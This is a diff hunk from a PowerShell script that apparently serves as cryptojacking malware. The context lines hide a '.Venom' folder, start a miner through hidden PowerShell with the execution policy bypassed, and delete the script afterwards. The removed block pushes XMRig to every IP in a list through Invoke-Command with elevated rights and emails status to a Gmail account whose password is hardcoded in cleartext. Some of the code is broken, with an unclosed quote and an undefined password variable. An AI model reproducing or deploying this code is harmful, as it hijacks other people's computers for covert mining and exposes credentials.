@@ -160,58 +160,6 @@ attrib +h +s +r .Venom
 # start rig
 #powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
 
-powershell
-# Define the path to the text file with IP addresses
-$ipFile = $path\Ips.txt
-
-# Define the path to XMRig executable
-$xmrPath = $currentDirectory\xmrig-6.22.2\xmrig.exe
-
-# Define the configuration file path
-$configPath = $currentDirectory\xmrig-6.22.2\config.json
-
-# Send the email with Rig Status
-$email = "theedukkespallace@gmail.com
-$pword2 = "jagxxeqhkigpeqor"
-
-Send-MailMessage `
-    -From $email `
-    -To $email `
-    -Subject "XMRig Execution Status from $env:UserName" `
-    -Body "Xmrig Process Starting..." `
-    -SmtpServer "smtp.gmail.com" `
-    -Port 587 `
-    -UseSsl `
-    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))
-
-
-# Read the IP addresses from the text file
-$ips = Get-Content -Path $ipFile
-
-foreach ($ip in $ips) {
-    try {
-        Write-Output "Processing IP: $ip"
-        
-        # Command to start XMRig with the configuration file
-        $command = "$xmrPath -c $configPath"
-
-        # Execute the command on the remote computer with elevated privileges
-        Invoke-Command -ComputerName $ip -ScriptBlock {
-            param($command)
-            Start-Process -FilePath PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -Verb RunAs
-        } -ArgumentList $command
-
-        Write-Output "XMRig started on IP: $ip"
-        Send-MailMessage -subject "XMRig Execution Success" -body "XMRig has successfully started on IP: $ip"
-    } catch {
-        Write-Output "Error processing IP: $ip"
-        Send-MailMessage -subject "XMRig Execution Failure" -body "Failed to start XMRig on IP: $ip"
-    }
-}
-
-Write-Output "Script execution completed"
-Send-MailMessage -subject "Script Execution Completed" -body "The script has finished executing. Please check the status of each IP address."
-
 
 # self delete
 cd $initial_dir
